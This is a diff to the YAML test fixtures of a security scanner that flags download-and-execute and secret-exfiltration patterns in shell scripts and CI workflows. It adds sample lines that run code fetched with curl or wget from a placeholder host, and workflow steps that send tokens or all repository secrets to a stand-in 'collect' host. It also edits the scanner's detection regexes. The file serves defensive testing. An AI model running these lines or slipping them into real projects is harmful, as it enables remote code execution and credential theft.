@@ -24,13 +24,13 @@ RC-DLX-001:
       files:
         scanner/patterns.py: |
           PATTERNS = [
-              (r"curl\s+[^|]*\|\s*(?:sudo\s+)?(?:python|python3|node)", 0.9),
+              (r"curl [^|]*\|\s*(?:sudo\s+)?(?:python|python3|node)", 0.9),
           ]
       expect: [{path: scanner/patterns.py, line: 2, confidence: low}]
     - name: detection pattern in a JavaScript regex literal is reported with low confidence
       files:
         src/rules.js: |
-          const pipe = /wget\s+[^|]*\|\s*(?:node|python)/;
+          const pipe = /wget [^|]*\|\s*(?:node|python)/;
       expect: [{path: src/rules.js, line: 1, confidence: low}]
     - name: regex syntax outside a string does not lower the confidence
       files:
@@ -55,6 +55,26 @@ RC-DLX-001:
       files:
         setup.sh: "bash -c \"`curl -s https://example.invalid/p`\"\n"
       expect: [{path: setup.sh, line: 1}]
+    - name: process substitution with options, source, dot and an interpreter
+      files:
+        a.sh: "bash -x <(curl -fsSL https://example.invalid/p)\n"
+        b.sh: "source <(wget -qO- https://example.invalid/p)\n"
+        c.sh: ". <(curl -s https://example.invalid/p)\n"
+        d.sh: "bash < <(curl -s https://example.invalid/p)\n"
+        e.sh: "python3 <(curl -s https://example.invalid/p.py)\n"
+        f.sh: "sudo bash -s -- --yes <(curl -s https://example.invalid/p)\n"
+      expect:
+        - {path: a.sh, line: 1}
+        - {path: b.sh, line: 1}
+        - {path: c.sh, line: 1}
+        - {path: d.sh, line: 1}
+        - {path: e.sh, line: 1}
+        - {path: f.sh, line: 1}
+    - name: here-string of a download
+      files:
+        a.sh: "bash <<< \"$(curl -s https://example.invalid/p)\"\n"
+        b.sh: "source /dev/stdin <<< \"$(wget -qO- https://example.invalid/p)\"\n"
+      expect: [{path: a.sh, line: 1}, {path: b.sh, line: 1}]
     - name: pipe into the shell on a continuation line
       files:
         setup.sh: "#!/bin/sh\ncurl -s https://example.invalid/p \\\n  | sh\n"
@@ -84,6 +104,10 @@ RC-DLX-001:
       files:
         a.sh: "curl -s https://example.invalid/p | env grep x\ncurl -s https://example.invalid/p | shasum -a 256\n"
         b.sh: "eval \"$(ssh-agent -s)\"\nVERSION=\"$(curl -s https://example.invalid/version)\"\n"
+    - name: process substitution that compares or sources local output
+      files:
+        a.sh: "diff <(curl -s https://example.invalid/a) <(curl -s https://example.invalid/b)\n"
+        b.sh: "source <(kubectl completion bash)\nwhile read -r l; do echo \"$l\"; done < <(curl -s https://example.invalid/list)\n"
     - name: continuation lines without a pipe into a shell
       files:
         fetch.sh: "curl -s https://example.invalid/p \\\n  -o data.json\nsh build.sh\n"
@@ -302,3 +326,63 @@ RC-DLX-007:
       files:
         tests/fixtures/s.sh: |
           S=$(curl -s https://example.invalid/payload); sh -c "$S"
+
+RC-DLX-008:
+  positive:
+    - name: workflow secret and token variable in a query string
+      files:
+        .github/workflows/ping.yml: |
+          on: push
+          jobs:
+            p:
+              runs-on: ubuntu-latest
+              steps:
+                - run: curl -s "https://collect.example.invalid/p?t=${{ secrets.NPM_TOKEN }}"
+        notify.sh: |
+          #!/bin/sh
+          wget -q "https://collect.example.invalid/n?repo=x&key=$GITHUB_TOKEN" -O /dev/null
+      expect:
+        - {path: .github/workflows/ping.yml, line: 6, severity: low, confidence: low}
+        - {path: notify.sh, line: 2}
+    - name: environment value in a JavaScript template URL
+      files:
+        report.js: |
+          fetch(`https://collect.example.invalid/r?s=${process.env.AWS_SECRET_ACCESS_KEY}`);
+      expect: [{path: report.js, line: 1}]
+  negative:
+    - name: secrets in headers, local URLs and ordinary query values
+      files:
+        api.sh: |
+          curl -H "Authorization: Bearer $GITHUB_TOKEN" "https://api.example.invalid/repos?page=$PAGE"
+          curl "http://localhost:8080/debug?token=$DEV_TOKEN"
+        # Comment lines do not run.
+        doc.py: |
+          # https://api.example.invalid/x?key=$API_KEY
+          url = f"https://api.example.invalid/items?limit={limit}"
+
+RC-DLX-009:
+  positive:
+    - name: step sends toJSON(secrets) with curl
+      files:
+        .github/workflows/sync.yml: |
+          on: push
+          jobs:
+            s:
+              runs-on: ubuntu-latest
+              steps:
+                - name: sync
+                  env:
+                    ALL: ${{ toJSON(secrets) }}
+                  run: curl -s -X POST -d "$ALL" https://collect.example.invalid/s
+      expect: [{path: .github/workflows/sync.yml, line: 8}]
+  negative:
+    - name: toJSON(secrets) turned into environment variables, request in another step
+      files:
+        .github/workflows/deploy.yml: |
+          on: push
+          jobs:
+            d:
+              runs-on: ubuntu-latest
+              steps:
+                - run: echo '${{ toJSON(secrets) }}' | jq -r 'to_entries[] | "\(.key)=\(.value)"' >> "$GITHUB_ENV"
+                - run: curl -s -X POST https://deploy.example.invalid/hook
